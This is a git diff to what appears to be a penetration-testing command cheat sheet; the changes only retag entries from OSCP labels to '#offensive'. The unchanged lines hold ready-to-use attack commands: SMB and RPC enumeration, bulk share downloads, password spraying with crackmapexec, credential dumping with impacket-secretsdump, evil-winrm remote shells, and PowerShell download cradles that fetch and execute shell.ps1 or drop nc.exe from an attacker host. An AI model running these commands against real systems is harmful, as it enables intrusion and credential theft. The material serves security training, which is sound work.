@@ -13,7 +13,7 @@ smbclient -N -L //{{target-ip}}
 smbclient -N -L //10.10.10.10
 ```
 
-Tags :  #linux #smb #smbclient #oscp #pen-200
+Tags :  #linux #smb #smbclient #offensive
 
 ---
 
@@ -30,7 +30,7 @@ smbclient //{{target-ip}}/share -U {{username}}
 smbclient //10.10.10.10/share -U guest
 ```
 
-Tags :  #linux #smb #smbclient #oscp #pen-200
+Tags :  #linux #smb #smbclient #offensive
 
 ---
 
@@ -47,7 +47,7 @@ smbclient //{{target-ip}}/share -U {{username}} -c "recurse ON; prompt OFF; mget
 smbclient //10.10.10.10/data -U user -c "recurse ON; prompt OFF; mget *"
 ```
 
-Tags :  #linux #smb #smbclient #oscp #pen-200
+Tags :  #linux #smb #smbclient #offensive
 
 ---
 
@@ -64,7 +64,7 @@ rpcclient -U "" -N {{target-ip}} -c "enumdomusers"
 rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
 ```
 
-Tags :  #linux #rpc #rpcclient #oscp #pen-200
+Tags :  #linux #rpc #rpcclient #offensive
 
 ---
 
@@ -81,7 +81,7 @@ crackmapexec smb {{target-ip}} -u '' -p ''
 crackmapexec smb 10.10.10.10 -u '' -p ''
 ```
 
-Tags :  #linux #crackmapexec #smb #oscp #pen-200
+Tags :  #linux #crackmapexec #smb #offensive
 
 ---
 
@@ -98,7 +98,7 @@ crackmapexec smb {{target-ip}} -u {{user-file}} -p '{{password}}'
 crackmapexec smb 10.10.10.10 -u users.txt -p 'Winter2024!'
 ```
 
-Tags :  #linux #crackmapexec #smb #oscp #pen-200
+Tags :  #linux #crackmapexec #smb #offensive
 
 ---
 
@@ -115,7 +115,7 @@ impacket-secretsdump {{domain}}/{{username}}:'{{password}}'@{{target-ip}}
 impacket-secretsdump CORP/admin:'Passw0rd!'@10.10.10.10
 ```
 
-Tags :  #linux #impacket #ad #oscp #pen-200
+Tags :  #linux #impacket #ad #offensive
 
 ---
 
@@ -132,7 +132,7 @@ evil-winrm -i {{target-ip}} -u {{username}} -p '{{password}}'
 evil-winrm -i 10.10.10.10 -u administrator -p 'Welcome1!'
 ```
 
-Tags :  #linux #evil-winrm #windows #oscp #pen-200
+Tags :  #linux #evil-winrm #windows #offensive
 
 ---
 
@@ -149,7 +149,7 @@ ldapsearch -x -H ldap://{{target-ip}} -s base namingcontexts
 ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts
 ```
 
-Tags :  #linux #ldap #oscp #pen-200
+Tags :  #linux #ldap #offensive
 
 ---
 
@@ -166,7 +166,7 @@ powershell -c "IEX(New-Object Net.WebClient).DownloadString('{{url}}')"
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/shell.ps1')"
 ```
 
-Tags :  #windows #powershell #oscp #pen-200
+Tags :  #windows #powershell #offensive
 
 ---
 
@@ -183,6 +183,6 @@ powershell -c "Invoke-WebRequest '{{url}}' -OutFile {{file}}"
 powershell -c "Invoke-WebRequest 'http://10.10.14.2/nc.exe' -OutFile C:\Temp\nc.exe"
 ```
 
-Tags :  #windows #powershell #oscp #pen-200
+Tags :  #windows #powershell #offensive
 
 ---
